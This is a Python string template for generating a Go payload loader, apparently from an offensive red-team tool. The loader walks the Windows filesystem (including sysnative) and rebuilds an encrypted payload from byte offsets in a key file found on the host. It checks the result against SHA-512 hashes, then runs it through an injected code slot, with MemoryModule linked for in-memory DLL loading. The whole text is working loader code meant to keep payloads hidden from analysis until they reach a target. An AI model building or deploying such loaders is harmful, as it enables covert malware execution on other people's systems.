buildcode = """
package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
    {6}
)

//Checks and aborts on bad errors
func check(e error) {{
    if e != nil {{
        fmt.Println("[!] Error Reported: ",e)
    }}
}}

/*
=======================
== Walk'in componenets
=======================
*/

//Global variable only used if parsing entire FS first
var globalFile []fileDesc
var sysNativeDone = false

//describe the file info are interested in retrieving
type fileDesc struct {{
    isDir bool
    fPath string
    sName string
}}

//used by the walk function to process directories / files
// This function gets called every file / directory in the path thats being searched
func walk_path(path string, info os.FileInfo, err error) error {{
    //temp item holder
    var item fileDesc

    //check for errors
    if err != nil {{
        fmt.Println("[!] Error Reported: ",err)
        return nil
    }}

    //determine if directory
    if info.IsDir() {{
        item.isDir = true
    }} else {{
        item.isDir = false
    }}

    //set addtional parameters into the struct
    item.fPath = path
    item.sName = info.Name()
    globalFile = append(globalFile, item)

    //You would add check code here to call the combine function to test this path
    // plus env vars meet the check
    return nil
}}

//called similar to python version
func walk_os(scan_dir string) {{
    
    //Handle 32bit in 64bit machine sysnative
    sys_paths := []string{{"c:\\\\windows", "c:\\\\windows\\\\system32"}}
    //fmt.Println("Arch: "+runtime.GOARCH)
    if strings.Contains(runtime.GOARCH, "386") == true {{
        for _, s_path_check := range sys_paths {{
            // fmt.Println("Check: "+s_path_check+" vs Check: "+scan_dir)
            if strings.Compare(strings.ToLower(scan_dir), strings.ToLower(s_path_check)) == 0 && !sysNativeDone{{
                fmt.Println("[*] Checking sysnative - searching for 64-Bit path")
                sysNativeDone = true
                filepath.Walk("c:\\\\Windows\\\\sysnative", walk_path)

            }}
            //else 32bit do nothing special, but continue to walk the given path
        }}
    }}

    //Call Walk function to process all directories
    //You can either wait here for all directories to be processed and then perform checks...
    // If you want to perform checks for each file found then do it above in the walk function
    //
    // The beauty here is that you get back (in the global value globalFile) an array of structs
    //  which you can iterate through and know if they are directories or files and then use for
    //  the appropriate function
    _ = filepath.Walk(scan_dir, walk_path)

    fmt.Printf("[*] Total FS Length %v \\n", len(globalFile))
    //fmt.Printf("%v",globalFile)

    }}

/*
===========================
== End Walk'in componenets
===========================
*/

//unzip & unbase64 decode
func unCompress(lookup_raw *string) *bytes.Buffer {{

    // Decompress the payload, its zlib compressed
    var output bytes.Buffer

    // this is stupid
    data, err := base64.StdEncoding.DecodeString(string(*lookup_raw))
    check(err)

    //fmt.Println(data)

    // this is stupid
    var b bytes.Buffer
    b.Write([]byte(data))

    r, err := zlib.NewReader(&b)
    check(err)
    io.Copy(&output, r)
    r.Close()

    return &output
}}

//////////////////////////////////////////////////////////////////////////////////////////
/// Decrypt a small amount of the file and check against iterumhash
//////////////////////////////////////////////////////////////////////////////////////////

func decrypt_check_small(file_to_test string, test_table *[]byte, test_payload *[]byte, iterumhash *[]byte) bool {{
    //init some vars dawg
    var location uint32
    var size uint8
    test_payload_temp := []byte{{}}
    //open the pad (file we're rebuilding code from)
    pad, err := os.Open(file_to_test)
    if err != nil {{
        //some file open error, but don't abort the runs
        return false
    }}
    // Defer closing until the end, but this is needed to make sure we don't forget to close or an error / abort happens
    defer pad.Close()

    // loop through the short test_table to create a test match
    for i := 0; i < len(*test_table); i += 4 {{
        // loop through test_table reading from the key
        
        // it slices it dices
        
        buff1 := bytes.NewReader([]byte(string((*test_table)[i : i+3]) + string(0)))
        buff2 := bytes.NewReader((*test_table)[i+3 : i+4])

        // I hate the redirection
        err = binary.Read(buff1, binary.LittleEndian, &location)
        check(err)
        err = binary.Read(buff2, binary.LittleEndian, &size)
        check(err)

        //fmt.Println("Loc: ", location, " || Size: ", size)
        part := make([]byte, size)
        _, err = pad.Seek(int64(location), 0)
        if err != nil {{
            return false
        }}
        _, err = pad.Read(part)
        if err != nil {{
            return false
        }}

        // Rebuild the bytes here... do you know how long it took me to find '...'
        test_payload_temp = append(test_payload_temp, part...)

    }}

    //check the hash for match
    test_hash := sha512.Sum512(test_payload_temp)
    fmt.Printf("[*] Test Hash vs Search Hash:\\n%x\\n%x\\n", test_hash, *iterumhash)
    test_result := bytes.Equal(test_hash[:], (*iterumhash)[:])
    //return updated test payload if it matches
    if test_result == true {{
        fmt.Println("[*] Hashes are equal!")
        *test_payload = test_payload_temp
        return true
    }} else {{
        return false
    }}
}}

//////////////////////////////////////////////////////////////////////////////////////////
/// Decrypt all of the file
//////////////////////////////////////////////////////////////////////////////////////////

func decrypt_check_all(file_to_test string, full_table *[]byte, full_payload *[]byte, payload_hash *[]byte, minus_bytes int) bool {{
    //OK let's do full payload
    full_payload_temp := []byte{{}}
    var location uint32
    var size uint8

    pad, err := os.Open(file_to_test)
    if err != nil {{
        //some file open error, but don't abort the runs
        return false
    }}
    // Defer closing until the end, but this is needed to make sure we don't forget to close or an error / abort happens
    defer pad.Close()

    for i := 0; i < len(*full_table); i += 4 {{
        // loop through full_table reading from the key
        buff1 := bytes.NewReader([]byte(string((*full_table)[i : i+3]) + string(0)))
        buff2 := bytes.NewReader((*full_table)[i+3 : i+4])
        
        err = binary.Read(buff1, binary.LittleEndian, &location)
        check(err)

        err = binary.Read(buff2, binary.LittleEndian, &size)
        check(err)

        part := make([]byte, size)

        _, err = pad.Seek(int64(location), 0)
        check(err)
        _, err = pad.Read(part)
        check(err)

        //Rebuild payload here
        full_payload_temp = append(full_payload_temp, part...)
    }}

    fmt.Println("[*] Length of the Testing Payload ", len(full_payload_temp))
    if len(full_payload_temp) <= minus_bytes {{
        fmt.Println("[!] Resultant Size Too Small")
        return false
    }}
    payload_test_hash := sha512.Sum512(full_payload_temp[:len(full_payload_temp)-minus_bytes])
    fmt.Printf("[*] Temp Payload Hash:\\n%x\\n", payload_test_hash)

    fmt.Printf("[*] Search Payload Hash:\\n%x\\n", *payload_hash)

    final_result := bytes.Equal(payload_test_hash[:], (*payload_hash)[:])
    if final_result == true {{
        fmt.Println("[*] Hashes are equal!")
        *full_payload = full_payload_temp
        return true
    }} else {{
        return false
    }}
}}

//////////////////////////////////////////////////////////////////////////////////////////
/// Generic Decrypt Function - Sets up tests and such
//////////////////////////////////////////////////////////////////////////////////////////

func decrypt(iterumhash []byte, payload_hash []byte, lookup_table *bytes.Buffer, minus_bytes int) []byte {{
    ////////////////////////////////////////
    //Init decryption values that stay here
    ////////////////////////////////////////

    var initial_iteration_size uint32
    full_payload := []byte{{}}
    test_payload := []byte{{}}

    // get size of init_table
    size_init_table := make([]byte, 4)
    _, err := lookup_table.Read(size_init_table)
    check(err)

    fmt.Println("Inital Iteration Table : ", hex.EncodeToString(size_init_table))

    //Set buffer to size of size_init_table
    buf := bytes.NewReader(size_init_table)
    err = binary.Read(buf, binary.LittleEndian, &initial_iteration_size)
    check(err)

    fmt.Println("size of the initial test", initial_iteration_size)

    //Create test_table
    test_table := make([]byte, initial_iteration_size*4)
    _, err = lookup_table.Read(test_table)
    check(err)

    //get size of remaining
    size_of_full_table := lookup_table.Len()
    //fmt.Println("Size of full table: ", size_of_full_table)
    remaining_table := make([]byte, size_of_full_table)

    // Put together the full table
    // There is no SEEK for bytes.buffer (table flip)
    _, err = lookup_table.Read(remaining_table)
    full_table := append(test_table, remaining_table...)

    fmt.Println("size of the remaining table", size_of_full_table)

    //loop through all files and test against the %hash match first
    // then test the remaining hash
    // ** Note : I assumed we were taking the first % and appending it to the second full decryption, but
    //           that could be a future optimization
    for _, itr := range globalFile {{

        if !itr.isDir {{
            fmt.Printf("[*] Testing File: %v\\n", itr.fPath)
            if decrypt_check_small(itr.fPath, &test_table, &test_payload, &iterumhash) {{

                if decrypt_check_all(itr.fPath, &full_table, &full_payload, &payload_hash, minus_bytes) {{
                    fmt.Println("[*] Hashes are equal!")
                    return full_payload
                }} else {{
                    fmt.Printf("[!] Odd Case - 10 percent matches - final failed -- %v\\n", itr.fPath)
                }}
            }}
        }}
    }}
    return nil

}}

func main() {{

    raw_lookup_table := "{0}"
    lookup_table := unCompress(&raw_lookup_table)
    payload_hash,_ := hex.DecodeString("{1}") 
    iterumhash,_ := hex.DecodeString("{2}")  
    minus_bytes := int({3})  //number of bytes offset of the hash to prevent rainbow table type hashing
    scan_dir := filepath.FromSlash(`{5}`)     //location to start the full search

    if true == strings.HasPrefix(scan_dir, "%") {{
        if true == strings.HasSuffix(scan_dir, "%") {{
            fmt.Println("[*] Using env variable for directory scanning: ", scan_dir)
            // Strip "%"
            scan_dir = scan_dir[1:len(scan_dir) - 1] 
            // Get env path
            scan_dir = os.Getenv(scan_dir)
            fmt.Println("[*] Resolved Path for Scanning: ", scan_dir)
            if scan_dir == "" {{
                os.Exit(0)
            }}
        }}
    }}

    walk_os(scan_dir)     //walk the directory building table of files to check
    full_payload := decrypt(iterumhash, payload_hash, lookup_table, minus_bytes) //attempt decryption across FS
    if full_payload != nil {{
        fmt.Println("[*] Match Found!")
        {4}
    }}else {{
    fmt.Println("[!] No Matches Found")
    }}
}}

"""